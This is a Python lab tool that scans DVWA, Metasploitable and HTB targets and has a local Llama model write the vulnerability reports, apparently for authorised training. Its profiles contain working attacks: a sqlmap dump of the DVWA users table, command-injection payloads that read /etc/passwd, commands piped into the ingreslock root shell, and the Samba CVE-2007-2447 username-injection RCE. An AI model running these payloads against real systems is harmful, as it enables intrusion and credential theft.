#!/usr/bin/env python3
"""
llama_scan.py — one-command, Llama-driven vulnerability scanner + advisor.

For a given lab (dvwa / metasploitable / htb) this runs a fixed set of
read-only recon and proof-of-concept scans against the authorised target,
then feeds each raw scan output to a LOCAL Ollama model (default llama3:8b).
The model is the only "analyst": for every scan it writes the vulnerability
findings (with severity + CVE where identifiable) and concrete remediation,
and at the end it writes a per-lab executive SUMMARY. Nothing is ever sent to
any cloud service — Ollama runs locally, exactly like argus/llm.py.

Output layout (all under --outdir, default: llama-results/):

    llama-results/<lab>/NN-<name>.txt   raw tool output
    llama-results/<lab>/NN-<name>.md    Llama's analysis of that output
    llama-results/<lab>/00-SUMMARY.md   Llama's executive summary of the lab

This file is stdlib-only and self-contained so it runs unchanged both inside
the kali containers (dvwa/metasploitable) and natively on the Windows host
(htb). It is normally driven by ../run-llama-scans.ps1 (the single command),
but can also be run directly, e.g.:

    python3 llama-scan/llama_scan.py --lab dvwa
    python3 llama-scan/llama_scan.py --lab htb --target 10.129.109.234
"""

from __future__ import annotations

import argparse
import datetime as _dt
import json
import os
import re
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.request

# --------------------------------------------------------------------------
# Local LLM backend (Ollama). Same contract as argus/llm.py: local-only, fails
# loudly if the daemon is unreachable rather than silently going to the cloud.
# --------------------------------------------------------------------------

DEFAULT_OLLAMA = os.environ.get("LLAMA_SCAN_OLLAMA_HOST", "http://127.0.0.1:11434")

ANALYST_SYSTEM = (
    "You are a senior penetration tester and security analyst writing up an "
    "authorised lab assessment. You are given the raw output of ONE security "
    "scan or tool run. Produce a concise, well-structured Markdown report with "
    "these sections, in order:\n"
    "1. `## Open Ports / Services` — a Markdown table (Port | Service | Version "
    "| Notes) when the output contains port/service data; omit this section if "
    "the tool is not a port scan.\n"
    "2. `## Vulnerabilities & Weaknesses` — one `### Finding N: <title>` per "
    "issue, each with **Severity** (Critical/High/Medium/Low/Info), a "
    "**CVE**/identifier when one clearly applies, **What it is**, and **Why it "
    "matters**.\n"
    "3. `## Remediation` — concrete, actionable fixes; include exact commands "
    "or config snippets in fenced code blocks where useful.\n\n"
    "Rules: base every finding ONLY on the provided scan output — never invent "
    "services, ports, versions, or CVEs that are not evidenced there. If the "
    "output shows an error or nothing exploitable, say so plainly. Be specific "
    "and technical; no filler."
)

SUMMARY_SYSTEM = (
    "You are a senior penetration tester writing the executive summary of an "
    "authorised lab assessment. You are given the per-scan analyses for a "
    "single target. Produce a Markdown report with these sections:\n"
    "1. `## Executive Summary` — 3-5 sentences on the overall security "
    "posture.\n"
    "2. `## Severity-Ranked Findings` — a Markdown table (Severity | Finding | "
    "Port/Service | Impact) ordered most-severe first, consolidating the "
    "findings across all scans (de-duplicate).\n"
    "3. `## Top Remediation Priorities` — a numbered list of the highest-value "
    "fixes.\n\n"
    "Base everything ONLY on the analyses provided. Be concise and concrete."
)


_PREAMBLE = re.compile(
    r"^\s*(here is|here's|below is|sure[,!]?|certainly[,!]?)\b[^\n]*:?\s*\n+",
    re.IGNORECASE,
)


def _strip_preamble(text: str) -> str:
    """Drop a chatty lead-in line (\"Here is the report:\") some models emit."""
    return _PREAMBLE.sub("", text, count=1).lstrip()


class LLMUnavailable(RuntimeError):
    """Raised when the local Ollama backend cannot be reached."""


class Ollama:
    """Minimal Ollama /api/generate client — no third-party dependencies."""

    def __init__(self, host: str, model: str, timeout_s: int = 600) -> None:
        self.host = host.rstrip("/")
        self.model = model
        self.timeout_s = timeout_s

    def health(self) -> bool:
        try:
            with urllib.request.urlopen(f"{self.host}/api/tags", timeout=5):
                return True
        except urllib.error.URLError:
            return False

    def generate(self, prompt: str, *, system: str, max_tokens: int = 1600,
                 temperature: float = 0.1) -> str:
        payload = {
            "model": self.model,
            "prompt": prompt,
            "system": system,
            "stream": False,
            "options": {
                "temperature": temperature,
                "num_ctx": 8192,
                "num_predict": max_tokens,
            },
        }
        # think=False keeps reasoning-trace models (qwen3-family, incl. the
        # qwen3-based redsage) from spending the whole num_predict budget on
        # hidden reasoning and returning an empty answer. It is sent ONLY to
        # those models: this Ollama build returns HTTP 500 if `think` is sent
        # to a model without a think mode (e.g. llama3:8b), so we must not
        # include the field there rather than rely on it being ignored.
        if any(k in self.model.lower() for k in ("qwen", "redsage")):
            payload["think"] = False
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{self.host}/api/generate", data=data,
            headers={"Content-Type": "application/json"},
        )
        # Ollama sometimes returns a transient HTTP 5xx (mid model-load, a brief
        # VRAM/OOM blip, or momentarily busy). Retry a few times with backoff
        # before giving up, so one hiccup doesn't sink a whole scan.
        for attempt in range(1, 4):
            try:
                with urllib.request.urlopen(req, timeout=self.timeout_s) as resp:
                    body = json.loads(resp.read().decode("utf-8"))
                    return _strip_preamble(body.get("response", "").strip())
            except urllib.error.HTTPError as exc:
                if exc.code >= 500 and attempt < 3:
                    print(f"    [retry] Ollama HTTP {exc.code} "
                          f"(attempt {attempt}/3) ...")
                    time.sleep(2 * attempt)
                    continue
                raise LLMUnavailable(
                    f"Ollama at {self.host} returned HTTP {exc.code} for "
                    f"{self.model}. The prompt may be too large for the model's "
                    f"context, or the daemon is out of memory."
                ) from exc
            except urllib.error.URLError as exc:
                raise LLMUnavailable(
                    f"Cannot reach local Ollama at {self.host}: {exc}. Start it "
                    f"with `ollama serve` and pull the model with "
                    f"`ollama pull {self.model}`."
                ) from exc
        raise LLMUnavailable(f"Ollama at {self.host} failed after 3 attempts.")


# --------------------------------------------------------------------------
# Scan step running.
# --------------------------------------------------------------------------

_ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")


def strip_ansi(text: str) -> str:
    return _ANSI.sub("", text)


def _resolve_nmap() -> str:
    """Find nmap: on PATH, or the default Windows install location."""
    found = shutil.which("nmap")
    if found:
        return found
    win = r"C:\Program Files (x86)\Nmap\nmap.exe"
    return win if os.path.exists(win) else "nmap"


def run_step(step: dict, timeout_s: int = 900) -> str:
    """Run one scan step and return its combined stdout+stderr (ANSI-stripped)."""
    kind = step.get("kind", "bash")
    try:
        if kind == "argv":
            proc = subprocess.run(step["cmd"], capture_output=True, text=True,
                                  timeout=timeout_s)
        else:  # bash snippet — only used inside the Linux kali containers
            proc = subprocess.run(["bash", "-c", step["cmd"]], capture_output=True,
                                  text=True, timeout=timeout_s)
        out = (proc.stdout or "") + (proc.stderr or "")
    except subprocess.TimeoutExpired as exc:
        partial = ""
        if exc.stdout:
            partial += exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode(errors="replace")
        if exc.stderr:
            partial += exc.stderr if isinstance(exc.stderr, str) else exc.stderr.decode(errors="replace")
        out = f"[llama_scan] step timed out after {timeout_s}s.\n{partial}"
    except FileNotFoundError as exc:
        out = f"[llama_scan] could not run step (tool missing): {exc}"
    return strip_ansi(out).strip() or "[llama_scan] the tool produced no output."


# --------------------------------------------------------------------------
# Agentic mode: Llama decides what to scan and generates the commands itself.
# --------------------------------------------------------------------------
#
# Same safety model as argus/stages.py: commands run through shlex.split with
# NO shell, so nothing can chain or redirect; the first token must be an
# allowlisted read-only recon tool; shell metacharacters and file-write flags
# are rejected outright. The model only ever gets to pick WHICH allowlisted
# tool to run and with what flags — it cannot escape that box.

AGENTIC_ALLOWED = {
    "nmap", "nikto", "whatweb", "gobuster", "curl", "wget", "dig", "host",
    "whois", "nbtscan", "enum4linux", "smbclient", "rpcinfo", "showmount",
    "snmpwalk", "finger", "redis-cli", "searchsploit", "sqlmap",
}

_BAD_CHARS = (";", "&&", "||", "|", "`", "$(", ">", "<", "\n")
_BAD_FLAGS = ("-oa", "-on", "-ox", "-og", "-o", "--output", "--output-file")

AGENTIC_SYSTEM = (
    "You are a penetration tester driving a Kali Linux shell against ONE "
    "authorised lab target. Each turn you output EXACTLY ONE command that "
    "advances reconnaissance/scanning, and nothing else — no prose, no "
    "markdown fences, no explanation. When you have gathered enough to write "
    "up the vulnerabilities, output the single word DONE instead.\n\n"
    "Hard rules:\n"
    f"- Use ONLY these tools: {', '.join(sorted(AGENTIC_ALLOWED))}.\n"
    "- ONE command per turn. Never chain with ; | && || backticks or $().\n"
    "- Never write output to a file (no -oN/-oX/-oA/-o/--output); this harness "
    "captures stdout directly.\n"
    "- Only use flags you are certain exist for that exact tool; if unsure, run "
    "the tool with minimal flags rather than guessing.\n"
    "- Prefer non-interactive invocations (e.g. `smbclient -N -L //host`, "
    "`curl -sSI http://host/`) — you cannot type into a prompt."
)

AGENTIC_REPORT_SYSTEM = (
    "You are a senior penetration tester writing up an authorised lab "
    "assessment from a transcript of the commands you ran and their real "
    "output. Produce Markdown with: `## Open Ports / Services` (table, when "
    "applicable), `## Vulnerabilities & Weaknesses` (one `### Finding N` each "
    "with **Severity**, **CVE** when clear, **What it is**, **Why it "
    "matters**), and `## Remediation` (concrete fixes with commands/config). "
    "Ground every finding ONLY in the transcript; never invent output."
)


def _sanitise_cmd(raw: str) -> str:
    """Strip fences/prose; keep the first non-empty line as the command."""
    text = re.sub(r"```[a-zA-Z]*", "", raw).replace("```", "").strip()
    return next((ln.strip() for ln in text.splitlines() if ln.strip()), "")


def agentic_reject_reason(command: str) -> str | None:
    """Return why a command is rejected, or None if it is allowed to run."""
    if any(c in command for c in _BAD_CHARS):
        return "contains shell chaining/redirection (not permitted)"
    try:
        import shlex
        tokens = shlex.split(command)
    except ValueError:
        return "could not be parsed as a command"
    if not tokens:
        return "empty command"
    tool = os.path.basename(tokens[0])
    if tool not in AGENTIC_ALLOWED:
        return f"tool '{tool}' is not on the recon allowlist"
    if any(t.lower() in _BAD_FLAGS for t in tokens[1:]):
        return "uses a file-output flag (not permitted; stdout is captured)"
    return None


def run_agentic(llm: "Ollama", target: str, lab: str, outdir: str,
                max_steps: int = 6, cmd_timeout: int = 90) -> str | None:
    """Let the model drive: pick command -> run -> observe -> repeat -> report."""
    import shlex
    agdir = os.path.join(outdir, "agentic")
    os.makedirs(agdir, exist_ok=True)
    transcript: list[str] = []      # human-readable log written to disk
    history: list[str] = []         # compact context fed back to the model
    seen: set[str] = set()

    step = 0
    while step < max_steps:
        hist = "\n".join(history) if history else "(nothing run yet)"
        prompt = (
            f"Target: {target} (authorised {lab} lab)\n\n"
            f"Commands run so far and what they returned (truncated):\n{hist}\n\n"
            f"Output the next single command, or DONE if you have enough."
        )
        try:
            raw = llm.generate(prompt, system=AGENTIC_SYSTEM, max_tokens=120,
                               temperature=0.0)
        except LLMUnavailable as exc:
            # Persistent model failure: stop looping but keep everything run so
            # far — write out the transcript + a report from what we have.
            print(f"    [!] command generation failed, ending loop: {exc}")
            transcript.append(f"[command generation failed after {step} steps: {exc}]")
            break
        command = _sanitise_cmd(raw)
        if not command or command.strip(". ").upper() == "DONE":
            transcript.append(f"[model signalled DONE after {step} steps]")
            break

        reason = agentic_reject_reason(command)
        if reason:
            print(f"    [rejected] {command!r} -> {reason}")
            history.append(f"$ {command}\n[rejected: {reason}; choose another tool]")
            transcript.append(f"$ {command}\n[REJECTED: {reason}]\n")
            step += 1
            continue
        if command in seen:
            history.append(f"$ {command}\n[already run; do something different or DONE]")
            step += 1
            continue
        seen.add(command)

        step += 1
        print(f"    [step {step}] $ {command}")
        try:
            proc = subprocess.run(shlex.split(command), capture_output=True,
                                  text=True, timeout=cmd_timeout)
            out = strip_ansi(((proc.stdout or "") + (proc.stderr or "")).strip())
        except FileNotFoundError:
            out = f"[tool not installed on this host: {shlex.split(command)[0]}]"
        except subprocess.TimeoutExpired:
            out = f"[timed out after {cmd_timeout}s]"
        out = out or "[no output]"
        transcript.append(f"$ {command}\n{out}\n")
        history.append(f"$ {command}\n{out[:1200]}")

    # Persist the transcript and ask the model to write the findings report.
    tpath = os.path.join(agdir, "transcript.txt")
    with open(tpath, "w", encoding="utf-8") as fh:
        fh.write(f"# agentic transcript — {lab} — target {target}\n\n"
                 + "\n".join(transcript) + "\n")
    print(f"    -> {tpath}")

    if not any(line.startswith("$") for line in transcript):
        print("    [!] agentic mode produced no usable commands; no report written.")
        return None

    print(f"[*] writing agentic findings report with {llm.model} ...")
    joined = _clip("\n".join(transcript), 12000)
    try:
        report = llm.generate(
            f"Target: {target} (authorised {lab} lab)\n\n"
            f"Transcript of commands and their output:\n```\n{joined}\n```",
            system=AGENTIC_REPORT_SYSTEM, max_tokens=1800,
        )
    except LLMUnavailable as exc:
        print(f"    [!] report generation failed: {exc}")
        report = (f"> **Report unavailable** — the local model could not write "
                  f"the findings.\n>\n> `{exc}`\n>\n> The full command transcript "
                  f"is preserved in `transcript.txt`.")
    stamp = _dt.datetime.now().strftime("%Y-%m-%d %H:%M")
    rpath = os.path.join(agdir, "00-REPORT.md")
    with open(rpath, "w", encoding="utf-8") as fh:
        fh.write(f"# {lab} — Agentic Assessment (Llama-driven)\n\n"
                 f"*Target `{target}` · model `{llm.model}` drove the scanning "
                 f"AND the analysis · {stamp} · {len(seen)} commands run.*\n\n"
                 f"{report}\n")
    print(f"    -> {rpath}")
    return rpath


# --------------------------------------------------------------------------
# Per-lab scan profiles (scripted mode).
# --------------------------------------------------------------------------
#
# Each profile is a list of steps. A step with "analyze": False (e.g. the DVWA
# auth bootstrap) is run for its side effects only and not sent to the model.
# bash steps run inside the kali containers; argv steps run natively (htb).

def dvwa_profile(target: str) -> list[dict]:
    ck = "/tmp/llama_dvwa_cookie"          # captured by the bootstrap step
    base = f"http://{target}"
    return [
        {
            "name": "nmap", "title": "Nmap service/version scan",
            "cmd": f"nmap -sT -Pn -sV -sC {target}",
        },
        {
            "name": "web", "title": "Web fingerprint (whatweb + nikto + headers)",
            "cmd": (
                f"echo '### whatweb ###'; whatweb -a3 {base}/ ; "
                f"echo; echo '### response headers ###'; curl -sSI {base}/ ; "
                f"echo; echo '### robots.txt ###'; curl -sS {base}/robots.txt ; "
                f"echo; echo '### nikto ###'; nikto -host {base} -maxtime 120s -ask no"
            ),
        },
        {
            # Side-effect only: init DB, log in admin/password, set level=low,
            # and write the authenticated cookie to $ck for the steps below.
            "name": "bootstrap", "analyze": False,
            "cmd": (
                "set -e; CJ=/tmp/llama_dvwa.cj; rm -f $CJ; "
                "tok(){ grep -oP -m1 \"name='user_token' value='\\K[0-9a-f]+\"; }; "
                f"T=$(curl -s -c $CJ {base}/setup.php | tok); "
                f"curl -s -b $CJ -c $CJ --data-urlencode 'create_db=Create / Reset Database' "
                f"--data \"user_token=$T\" {base}/setup.php -o /dev/null; "
                f"LT=$(curl -s -b $CJ -c $CJ {base}/login.php | tok); "
                f"curl -s -b $CJ -c $CJ --data \"username=admin&password=password&Login=Login&user_token=$LT\" "
                f"{base}/login.php -o /dev/null; "
                f"ST=$(curl -s -b $CJ -c $CJ {base}/security.php | tok); "
                f"curl -s -b $CJ -c $CJ --data \"security=low&seclev_submit=Submit&user_token=$ST\" "
                f"{base}/security.php -o /dev/null; "
                f"PHPSESSID=$(grep -i PHPSESSID $CJ | awk '{{print $7}}'); "
                f"printf 'PHPSESSID=%s; security=low' \"$PHPSESSID\" > {ck}; "
                f"echo \"bootstrap done, cookie=$(cat {ck})\""
            ),
        },
        {
            "name": "sqlmap", "title": "Authenticated SQL injection (sqlmap)",
            "cmd": (
                f"COOKIE=$(cat {ck}); "
                f"sqlmap -u '{base}/vulnerabilities/sqli/?id=1&Submit=Submit' "
                f"--cookie=\"$COOKIE\" -p id --batch --technique=BEU --flush-session "
                f"--banner --current-user --current-db --dbs -D dvwa -T users --dump"
            ),
        },
        {
            "name": "cmdi", "title": "Command injection (/vulnerabilities/exec/)",
            "cmd": (
                f"COOKIE=$(cat {ck}); U='{base}/vulnerabilities/exec/'; "
                "for p in '127.0.0.1; id' '127.0.0.1; whoami' '127.0.0.1; uname -a' "
                "'127.0.0.1; cat /etc/passwd'; do "
                "echo \"=== payload: ip=$p ===\"; "
                "curl -s -b \"$COOKIE\" --data-urlencode \"ip=$p\" --data 'Submit=Submit' \"$U\" "
                "| sed -n '/<pre>/,/<\\/pre>/p' | sed 's/<[^>]*>//g'; echo; done"
            ),
        },
    ]


def metasploitable_profile(target: str) -> list[dict]:
    mark = "llama_smb_rce"
    return [
        {
            "name": "nmap", "title": "Nmap service/version scan",
            "cmd": f"nmap -sT -Pn -sV -sC {target}",
        },
        {
            "name": "ingreslock", "title": "TCP 1524 ingreslock — unauthenticated root shell",
            "cmd": (
                f"printf 'id\\nwhoami\\nuname -a\\nhostname\\nhead -n 20 /etc/passwd\\nexit\\n' "
                f"| nc -w 6 {target} 1524"
            ),
        },
        {
            "name": "samba", "title": "Samba usermap_script RCE (CVE-2007-2447)",
            "cmd": (
                f"echo '### smb.conf directive check (via 1524 root shell) ###'; "
                f"printf 'grep -niE \"username map|map script\" /etc/samba/smb.conf; smbd -V; exit\\n' "
                f"| nc -w 6 {target} 1524; echo; "
                f"echo '### attempting RCE via smbclient username injection ###'; "
                f"CMD='id > /tmp/{mark} 2>&1; uname -a >> /tmp/{mark} 2>&1'; "
                f"printf 'rm -f /tmp/{mark}; exit\\n' | nc -w 4 {target} 1524 >/dev/null 2>&1 || true; "
                f"for pre in './=' '/='; do "
                f"  timeout 15 smbclient //{target}/tmp -m NT1 --option='client min protocol=NT1' "
                f"    -U \"$pre\\`nohup sh -c '$CMD'\\`%\" -c 'exit' >/dev/null 2>&1 || true; "
                f"done; sleep 2; "
                f"echo '### proof (read back via 1524 root shell) ###'; "
                f"printf 'cat /tmp/{mark} 2>/dev/null || echo INJECTION_DID_NOT_RUN; exit\\n' "
                f"| nc -w 6 {target} 1524"
            ),
        },
    ]


def htb_profile(target: str) -> list[dict]:
    nmap = _resolve_nmap()
    return [
        {
            "name": "nmap", "title": "Nmap service/version scan",
            "kind": "argv",
            "cmd": [nmap, "-sT", "-Pn", "-sV", "-sC", target],
        },
    ]


PROFILES = {
    "dvwa": ("target-w", dvwa_profile),
    "metasploitable": ("target-m", metasploitable_profile),
    "htb": (None, htb_profile),
}


# --------------------------------------------------------------------------
# Report writing.
# --------------------------------------------------------------------------

def _clip(text: str, limit: int = 7000) -> str:
    """Keep raw scan text within the model's context: head + tail on overflow."""
    if len(text) <= limit:
        return text
    head, tail = text[: limit // 2], text[-limit // 2:]
    return f"{head}\n\n...[{len(text) - limit} chars trimmed]...\n\n{tail}"


def main() -> int:
    ap = argparse.ArgumentParser(description="Llama-driven scan + vuln advisor.")
    ap.add_argument("--lab", required=True, choices=sorted(PROFILES))
    ap.add_argument("--target", default=None,
                    help="override target host/IP (required for htb)")
    ap.add_argument("--model", default="llama3:8b", help="Ollama model tag")
    ap.add_argument("--ollama-host", default=DEFAULT_OLLAMA)
    ap.add_argument("--outdir", default="llama-results")
    ap.add_argument("--agentic", action="store_true",
                    help="let the model choose and run the commands itself "
                         "(vs. the default fixed scripted scans)")
    ap.add_argument("--max-steps", type=int, default=6,
                    help="agentic mode: max commands the model may run")
    args = ap.parse_args()

    # On Windows (the HTB path runs natively), make sure the default Nmap
    # install dir is on PATH so agentic-mode `nmap ...` commands resolve too —
    # the scripted profile already uses an absolute path, but the model emits
    # bare `nmap`.
    if sys.platform == "win32":
        nmap_dir = r"C:\Program Files (x86)\Nmap"
        if os.path.isdir(nmap_dir) and nmap_dir.lower() not in os.environ.get("PATH", "").lower():
            os.environ["PATH"] = nmap_dir + os.pathsep + os.environ.get("PATH", "")

    default_target, profile_fn = PROFILES[args.lab]
    target = args.target or default_target
    if not target:
        print(f"[!] --lab {args.lab} needs an explicit --target (e.g. the HTB "
              f"machine IP).", file=sys.stderr)
        return 2

    llm = Ollama(args.ollama_host, args.model)
    print(f"[*] lab={args.lab} target={target} model={args.model} "
          f"ollama={args.ollama_host}")
    if not llm.health():
        print(f"[!] Ollama not reachable at {args.ollama_host}. Is `ollama serve` "
              f"running?", file=sys.stderr)
        return 3

    outdir = os.path.join(args.outdir, args.lab)
    os.makedirs(outdir, exist_ok=True)

    # Agentic mode: the model drives the scanning end to end.
    if args.agentic:
        print(f"[*] AGENTIC mode — {args.model} will choose and run the commands.")
        run_agentic(llm, target, args.lab, outdir, max_steps=args.max_steps)
        print(f"[+] done. Agentic results in {outdir}/agentic/")
        return 0

    steps = profile_fn(target)

    def safe_generate(*a, **kw) -> str:
        """Never let one model failure abort the whole run — the raw scans and
        the other analyses are worth keeping even if one write-up fails."""
        try:
            return llm.generate(*a, **kw)
        except LLMUnavailable as exc:
            print(f"    [!] analysis failed: {exc}")
            return (f"> **Analysis unavailable** — the local model could not "
                    f"produce this section.\n>\n> `{exc}`\n>\n> The raw scan "
                    f"output is preserved alongside this file.")

    analyses: list[tuple[str, str]] = []   # (title, analysis markdown)
    idx = 0
    for step in steps:
        analyze = step.get("analyze", True)
        title = step.get("title", step["name"])
        if analyze:
            idx += 1
        tag = f"{idx:02d}-{step['name']}" if analyze else f"prep-{step['name']}"
        print(f"[*] running {tag}: {title} ...")
        raw = run_step(step)

        if not analyze:
            print(f"    (prep step) {raw.splitlines()[-1] if raw else ''}")
            continue

        raw_path = os.path.join(outdir, f"{tag}.txt")
        with open(raw_path, "w", encoding="utf-8") as fh:
            fh.write(raw + "\n")

        print(f"[*] analysing {tag} with {args.model} ...")
        prompt = (
            f"Target: {target} (authorised lab)\n"
            f"Scan: {title}\n\n"
            f"Raw tool output:\n```\n{_clip(raw)}\n```"
        )
        analysis = safe_generate(prompt, system=ANALYST_SYSTEM)
        md_path = os.path.join(outdir, f"{tag}.md")
        with open(md_path, "w", encoding="utf-8") as fh:
            fh.write(f"# {args.lab} — {title}\n\n"
                     f"*Target `{target}` · analysed by `{args.model}` via local "
                     f"Ollama.*\n\n{analysis}\n")
        analyses.append((title, analysis))
        print(f"    -> {raw_path}  +  {md_path}")

    # Executive summary across all analyses.
    if analyses:
        print(f"[*] writing executive summary with {args.model} ...")
        joined = "\n\n".join(f"### {t}\n{a}" for t, a in analyses)
        summary = safe_generate(
            f"Target: {target} (authorised lab)\n\n"
            f"Per-scan analyses:\n\n{_clip(joined, 12000)}",
            system=SUMMARY_SYSTEM, max_tokens=1800,
        )
        stamp = _dt.datetime.now().strftime("%Y-%m-%d %H:%M")
        sum_path = os.path.join(outdir, "00-SUMMARY.md")
        with open(sum_path, "w", encoding="utf-8") as fh:
            fh.write(f"# {args.lab} — Assessment Summary\n\n"
                     f"*Target `{target}` · model `{args.model}` · {stamp} · "
                     f"{len(analyses)} scans.*\n\n{summary}\n")
        print(f"    -> {sum_path}")

    print(f"[+] done. Results in {outdir}/")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
